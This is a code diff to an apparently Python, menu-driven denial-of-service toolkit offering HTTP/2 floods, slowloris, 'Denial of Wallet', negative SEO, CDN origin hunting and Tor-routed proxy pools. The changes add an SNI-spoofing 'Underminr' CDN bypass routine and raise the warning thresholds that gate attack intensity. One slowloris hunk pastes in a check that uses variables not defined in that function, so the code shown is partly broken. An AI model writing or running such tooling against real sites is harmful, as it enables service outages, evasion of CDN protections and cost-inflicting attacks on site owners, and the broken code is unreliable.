@@ -329,7 +329,7 @@ def menu():
   [bold yellow][8][/] [bold white]Mixed Attack[/]    [dim white]ALL 26 vectors parallel[/]           [bold yellow][Y][/] [bold white]Cold Start[/]      [dim white]Serverless auto-scale[/]
   [bold yellow][9][/] [bold white]Auto Mode[/]       [dim white]AI-driven adaptive bypass[/]         [bold yellow][Z][/] [bold white]Cost Acc[/]        [dim white]Denial of Wallet[/]
   [bold yellow][N][/] [bold white]Advanced 2026[/]   [dim white]Behavioral + Fingerprint[/]          [bold yellow][K][/] [bold white]SEO Attack[/]      [dim white]Negative SEO manipulation[/]
-  [bold yellow][H][/] [bold white]Origin Hunt[/]     [dim white]Find IP behind CDN[/]                [bold yellow][L][/] [bold white]Business Logic[/]  [dim white]Low-slow resource drain[/]
+  [bold yellow][H][/] [bold white]Origin Hunt[/]     [dim white]Find IP + Underminr CDN bypass[/]          [bold yellow][L][/] [bold white]Business Logic[/]  [dim white]Low-slow resource drain[/]
   [bold yellow][P][/] [bold white]Harvest Proxy[/]   [dim white]Auto-scrape 24k+ proxies[/]          [bold yellow][M][/] [bold white]Bypass Config[/]   [dim white]Toggle evasion modules[/]
   [bold yellow][0][/] [bold white]Dashboard[/]       [dim white]Web monitoring panel[/]
 
@@ -1013,14 +1013,14 @@ async def prompt_attack_options(target: str, ask_proxy: bool = True, ask_origin:
                         for h in healthy:
                             print(f"    Tor#{h['instance_id']} {h['exit_ip']}")
 
-                    if healthy:
-                        from core.network.tor_manager import TOR_BASE_SOCKS_PORT
-                        from core.network.proxy import ProxyPool
-                        proxy_pool = ProxyPool(connect_timeout=10)
-                        for h in healthy:
-                            socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
-                            proxy_pool._pending.append(f"socks5://127.0.0.1:{socks_port}")
-                        print(f" {c('g','[+]')} Tor ready: {len(healthy)} instances")
+                        if healthy:
+                            from core.network.tor_manager import TOR_BASE_SOCKS_PORT
+                            from core.network.proxy import ProxyPool
+                            proxy_pool = ProxyPool(connect_timeout=10)
+                            for h in healthy:
+                                socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
+                                proxy_pool._pending.append(f"socks5://127.0.0.1:{socks_port}")
+                            print(f" {c('g','[+]')} Tor ready: {len(healthy)} instances")
             except Exception as e:
                 print(f" {c('r','[-]')} Tor setup error: {e}")
         # else (option 4 or anything else) = no proxies
@@ -1731,10 +1731,10 @@ async def run_http2_flood(target: str, cfg: dict):
     rps = int(get_input(" Target RPS (default 4000): ") or "4000")
     threads = int(get_input(" Workers (default 250): ") or "250")
     
-    # Self-DoS protection
-    if duration > 600 or threads > 400 or rps > 8000:
-        print(f" {c('y','[!]')} WARNING: High settings detected (duration={duration}s, threads={threads}, rps={rps})")
-        print(f" {c('y','[!]')} This may cause self-DoS (disconnect your own internet)")
+    # Self-DoS protection (liberal - user knows their limits)
+    if duration > 300 or threads > 500 or rps > 100000:
+        print(f" {c('y','[!]')} WARNING: Very high settings (duration={duration}s, threads={threads}, rps={rps})")
+        print(f" {c('y','[!]')} This may cause self-DoS")
         confirm = get_input(" Continue anyway? (y/N): ").lower()
         if confirm != "y":
             print(f" {c('r','[-]')} Cancelled.")
@@ -1946,9 +1946,9 @@ async def run_slowloris(target: str, cfg: dict):
     duration = int(get_input(" Duration (seconds, default 300): ") or "300")
     connections = int(get_input(" Connections (default 1500): ") or "1500")
     
-    # Self-DoS protection
-    if duration > 1200 or connections > 3000:
-        print(f" {c('y','[!]')} WARNING: High settings (duration={duration}s, connections={connections})")
+    # Self-DoS protection (liberal - user knows their limits)
+    if duration > 300 or threads > 500 or rps > 100000:
+        print(f" {c('y','[!]')} WARNING: Very high settings (duration={duration}s, threads={threads}, rps={rps})")
         print(f" {c('y','[!]')} This may cause self-DoS")
         confirm = get_input(" Continue anyway? (y/N): ").lower()
         if confirm != "y":
@@ -3202,6 +3202,9 @@ async def cmd_menu(cfg):
             target = get_input(" Target URL: ")
             if not target: continue
             await run_origin_hunt(target, env)
+            # Offer Underminr CDN bypass after origin hunt
+            if get_input(" Try Underminr CDN bypass? (Y/n): ").lower() != "n":
+                await run_underminr_bypass(target)
             get_input(" Press Enter to continue...")
         elif choice == "P":
             target = get_input(" Target URL (optional, for filtering): ")
@@ -3784,8 +3787,32 @@ async def run_dow_attack(target: str, cfg: dict, method: str, label: str):
         vec["status"] = "error"
     
     await dashboard.stop()
-    
+                            
     print_attack_summary(target, duration, result)
+
+
+async def run_underminr_bypass(target: str):
+    """Underminr CDN Bypass - SNI spoofing against shared edge IPs (2026 technique)"""
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    print(f"\n {c('c','[*]')} Underminr CDN Bypass | {target}")
+    print(f" {c('c','[*]')} Technique: SNI spoofing against shared edge IPs")
+    print(f" {c('c','[*]')} Exploits architectural CDN flaw (2026)")
+    _rich_sep()
+
+    result = await run_go_engine(
+        target=target, duration=30, rps=1,
+        method="underminr", threads=5,
+    )
+
+    # Parse result for bypass success
+    total = result.get("total_requests", 0)
+    completed = result.get("completed", 0)
+    if completed > 0:
+        print(f" {c('g','[+]')} Underminr bypass found working SNI-edge IP combinations!")
+    else:
+        print(f" {c('y','[!]')} Underminr bypass did not find any working combination")
 
 
 async def run_origin_hunt(target: str, env: dict):
